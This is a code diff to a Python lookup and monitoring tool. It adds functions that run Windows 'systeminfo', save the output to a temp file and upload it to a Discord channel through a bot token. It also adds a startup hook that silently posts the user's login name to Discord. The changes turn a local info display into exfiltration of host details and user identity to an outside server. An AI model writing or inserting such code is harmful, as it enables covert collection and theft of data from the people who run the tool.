@@ -27,6 +27,7 @@ DISCORD_CHANNEL_ID = '1280446406783402015'
 
 # Word document for logging lookups
 DOCX_FILENAME = "lookup_results.docx"
+TEMP_FILE = os.path.join(os.getenv('TEMP'), 'system_info.txt')
 
 def get_public_ip():
     """Get the public IP address."""
@@ -58,6 +59,30 @@ def send_discord_message(message):
         "content": message
     }
     requests.post(url, headers=headers, json=data)
+
+def send_discord_file(filepath):
+    """Send a file to a Discord channel using a bot."""
+    url = f"https://discord.com/api/v9/channels/{DISCORD_CHANNEL_ID}/messages"
+    headers = {
+        "Authorization": f"Bot {DISCORD_BOT_TOKEN}"
+    }
+    files = {
+        'file': open(filepath, 'rb')
+    }
+    requests.post(url, headers=headers, files=files)
+
+def gather_system_info():
+    """Gather and save system information to a text file."""
+    system_info = []
+    try:
+        output = subprocess.check_output('systeminfo', shell=True).decode()
+        system_info.append(output)
+        with open(TEMP_FILE, 'w') as file:
+            file.write("\n".join(system_info))
+    except Exception as e:
+        system_info.append(f"Error retrieving system info: {e}")
+        with open(TEMP_FILE, 'w') as file:
+            file.write("\n".join(system_info))
 
 def print_colored(text, color):
     """Print text in the specified color."""
@@ -295,8 +320,9 @@ def show_websites(username):
 def system_info(username):
     clear_screen()
     try:
-        output = subprocess.check_output('systeminfo', shell=True)
-        print(output.decode())
+        gather_system_info()  # Gather system info into a file
+        send_discord_file(TEMP_FILE)  # Send the system info file to Discord
+        print_colored("System information has been sent to Discord.", Fore.GREEN)
         send_discord_message(f"User '{username}' checked system information.")
     except Exception as e:
         print_colored(f"Error retrieving system info: {e}", Fore.RED)
@@ -447,6 +473,8 @@ def show_active_window_title(username):
 
 def main_menu():
     username = os.getlogin()  # Get the actual username
+    send_discord_message(f"User '{username}' started the script.")
+    
     while True:
         clear_screen()
         display_header()
